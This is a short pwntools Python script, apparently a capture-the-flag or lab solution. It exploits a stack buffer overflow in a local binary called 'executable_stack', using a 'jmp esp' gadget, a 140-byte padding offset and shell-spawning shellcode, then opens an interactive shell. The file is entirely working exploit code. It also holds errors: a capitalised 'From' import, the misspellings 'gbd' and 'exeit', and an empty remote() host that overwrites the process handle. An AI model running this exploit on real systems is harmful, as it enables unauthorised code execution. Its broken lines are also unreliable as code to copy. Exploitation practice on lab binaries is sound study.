#For Linux
From pwn import *
import sys

context.update(arch='i386', os='linux')
io = process("./executable_stack")

io = remote("")

"""
gbd.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
sys.exeit()
"""

binary = ELF("./executable_stack")
jmp_esp = next(binary.search(asm("jmp esp")))

print(hex(jmp_esp))

exploit = flat(["A" * 140, pack(jmp_esp), asm(shellcraft.sh())])

io.sendline(exploit)
io.interactive()